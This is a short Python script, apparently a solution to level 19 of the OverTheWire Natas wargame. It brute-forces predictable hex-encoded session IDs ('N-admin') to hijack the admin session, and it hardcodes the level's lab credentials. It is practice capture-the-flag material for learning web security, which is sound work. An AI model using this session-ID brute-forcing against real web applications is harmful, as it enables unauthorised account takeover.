#!/usr/bin/python3
# Time: 2019/04/23 1:21 PM


import re
import time
import requests
import base64
import codecs



"""  
1. 查看初始的PHPSESSID, 用hex解码看看
2. python3 bytes ---> string:
   b'some'.decode('utf-8')
3. 
"""

username = 'natas19'
password = '4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs'
url = f'http://{username}.natas.labs.overthewire.org/'
s = requests.Session()

# resp = s.post(url, auth=(username, password), data={"username": "please", "password": "subscribe"})
# print(resp.text)
# print(s.cookies)

for i in range(50, 200):
    # g = str(codecs.encode(b"%d-admin" % i, "hex"))
    g = codecs.encode(b"%d-admin" % i, "hex").decode('utf-8')
    resp = s.get(url, auth=(username, password), data={"username": "admin", "password": "subscribe"},cookies={"PHPSESSID": g})
    # print(resp.text)
    if "regular" not in resp.text:
        print("this is the one !", i)
        print(resp.text)
        break

    else:
        print("tring : ", i, g)

# g = codecs.encode((b"%d-admin" % 89), "hex")
# .decode('utf-8')

# print(g)
# resp = s.get(url, auth=(username, password), cookies={"PHPSESSID": g})
# print(g)
# print(resp.text)


